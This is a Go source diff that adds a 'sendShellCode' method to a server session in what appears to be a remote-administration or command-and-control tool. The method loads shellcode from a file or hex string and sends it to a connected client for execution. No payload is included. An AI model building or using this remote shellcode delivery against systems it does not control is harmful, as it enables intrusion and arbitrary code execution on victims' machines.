@@ -1,6 +1,7 @@
 package server
 
 import (
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -421,4 +422,29 @@ func (session *Session) downloadFileBatch(fileListPath string) <-chan sio.Status
 	}()
 
 	return status
+}
+
+func (session *Session) sendShellCode(shellcode string) error {
+	// Refuse sending ShellCode if Arch is not supported
+	if session.ClientInterpreter.Arch != "386" && session.ClientInterpreter.Arch != "amd64" {
+		return fmt.Errorf("client arch (%s) is not supported", session.ClientInterpreter.Arch)
+	}
+
+	var scBytes []byte
+	var scErr error
+
+	// Attempt to read ShellCode from file in raw format
+	scBytes, scErr = os.ReadFile(shellcode)
+	// If file doesn't exist consider it a ShellCode in Hex format
+	if scErr != nil {
+		scBytes, scErr = hex.DecodeString(shellcode)
+		if scErr != nil {
+			return fmt.Errorf("failed to decode hex string")
+		}
+	}
+	if _, _, rErr := session.sendRequest("shellcode", false, scBytes); rErr != nil {
+		return fmt.Errorf("failed to send Shell Code request to Client")
+	}
+
+	return nil
 }
